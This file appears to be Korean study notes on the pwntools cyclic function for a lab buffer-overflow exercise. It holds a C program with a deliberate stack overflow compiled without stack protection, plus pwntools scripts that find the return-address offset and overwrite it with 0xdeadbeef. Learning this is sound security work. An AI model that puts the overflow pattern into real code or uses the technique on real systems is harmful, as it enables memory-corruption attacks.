@@ -1,0 +1,106 @@
+pwntools - cyclic :
+    cyclic 함수는 버퍼의 크기를 제대로 계산하지 않고 수많은 데이터를 입력해 리턴 주소가 덮였을 때 버퍼와 리턴 주소의 간격을 정확하게 알아낼 수 있습니다.
+    같은 값의 수많은 데이터를 입력하면 리턴 주소까지의 간격을 알 수 없습니다.
+    그렇기 때문에 cyclic은 데이터를 바이트마다 다르게 하여 리턴 주소까지의 간격을 계산할 수 있습니다.
+
+    cyclic.c는 dummy 구조체에 많은 멤버 변수를 삽입하면서 버퍼와 리턴 주소의 간격을 알아내기 힘들도록 했습니다.
+    ex)
+        // gcc -o cyclic cyclic.c -fno-stack-protector
+        #include <stdio.h>
+        #include <unistd.h>
+        struct dummy {
+            int name_len;
+            int age;
+            int page_num;
+            char name[1024];
+            char book_name[16];
+            int serial;
+            short nick_len;
+            char nickname[16];
+        };
+        int main()
+        {
+            struct dummy dummy;
+            read(0, dummy.name, 2048);
+            return 0;
+        }
+    
+    실제로 이보다 더 많은 멤버 변수가 선언되어 있을 경우에 리턴 주소까지의 정확한 간격을 알아내려면 자료형을 계산하는 시간이 필요합니다.
+    이때 익스플로잇의 속도를 높이기 위해 cyclic을 사용할 수 있습니다.
+    ex)
+        cyclic(2048)
+        'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaakgaakhaakiaakjaakkaaklaakmaaknaakoaakpaakqaakraaksaaktaakuaakvaakwaakxaakyaakzaalbaalcaaldaaleaalfaalgaalhaaliaaljaalkaallaalmaalnaaloaalpaalqaalraalsaaltaaluaalvaalwaalxaalyaalzaambaamcaamdaameaamfaamgaamhaamiaamjaamkaamlaammaamnaamoaampaamqaamraamsaamtaamuaamvaamwaamxaamyaamzaanbaancaandaaneaanfaangaanhaaniaanjaankaanlaanmaannaanoaanpaanqaanraansaantaanuaanvaanwaanxaanyaanzaaobaaocaaodaaoeaaofaaogaaohaaoiaaojaaokaaolaaomaaonaaooaaopaaoqaaoraaosaaotaaouaaovaaowaaoxaaoyaaozaapbaapcaapdaapeaapfaapgaaphaapiaapjaapkaaplaapmaapnaapoaappaapqaapraapsaaptaapuaapvaapwaapxaapyaapzaaqbaaqcaaqdaaqeaaqfaaqgaaqhaaqiaaqjaaqkaaqlaaqmaaqnaaqoaaqpaaqqaaqraaqsaaqtaaquaaqvaaqwaaqxaaqyaaqzaarbaarcaardaareaarfaargaarhaariaarjaarkaarlaarmaarnaaroaarpaarqaarraarsaartaaruaarvaarwaarxaaryaarzaasbaascaasdaaseaasfaasgaashaasiaasjaaskaaslaasmaasnaasoaaspaasqaasraassaastaasuaasvaaswaasxaasyaaszaatbaatcaatdaateaatfaatgaathaatiaatjaatkaatlaatmaatnaatoaatpaatqaatraatsaattaatuaatvaatwaatxaatyaatzaaubaaucaaudaaueaaufaaugaauhaauiaaujaaukaaulaau'
+
+    cyclic의 인자로 입력할 바이트의 수를 전달하면 4 바이트마다 다른 문자열로 2048 바이트의 문자열이 생성됩니다.
+    n 옵션에 따라 바뀌는 바이트의 인덱스는 변경할 수 있습니다.
+    ex)
+        cyclic(16, n = 1)
+        'abcdefghijklmnop'
+        cyclic(16, n = 4)
+        'aaaabaaacaaadaaa'
+
+    cyclic1.py는 8 바이트마다 바뀌는 2048 바이트의 문자열을 생성하고 입력하는 코드입니다.
+    ex)
+        # cyclic1.py
+        from pwn import *
+        
+        p = process("./cyclic")
+        payload = cyclic(2048, n=8)
+        
+        p.send(payload)
+        p.interactive()
+
+    이를 실행하고 ret 명령어에서 멈췄을 때의 rsp 레지스터를 확인하면 리턴 주소의 위치를 알 수 있습니다.
+    ex)
+        gdb-peda$ x/gx $rsp
+        0x7ffd3e3ba6e8:	0x6161616c66616161
+
+    리턴 주소가 0x6161616c66616161 값으로 덮인 것을 확인할 수 있습니다.
+    
+    cyclic.index는 생성된 문자열에서 인자로 주어진 문자열의 위치를 리턴합니다.
+    그렇다면 cyclic.index를 사용해서 0x6161616c66616161 문자열이 존재하는 위치를 알아내면 됩니다.
+    ex)
+        cyclic(2048, n=8).index(p64(0x6161616c66616161))
+        1084
+
+    1084 바이트 뒤에 리턴 주소가 있는 것을 알 수 있습니다.
+    
+    cyclic2.py는 리턴 주소를 0xdeadbeef 값으로 덮어쓰는 코드입니다.
+    ex)
+        # cyclic2.py 
+        from pwn import *
+        p = process("./cyclic")
+        
+        payload = "B"*1084
+        payload += p32(0xdeadbeef)
+        
+        p.send(payload)
+        p.interactive()
+    ex)
+        Stopped reason: SIGSEGV
+        0x00000000deadbeef in ?? ()
+        gdb-peda$ 
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
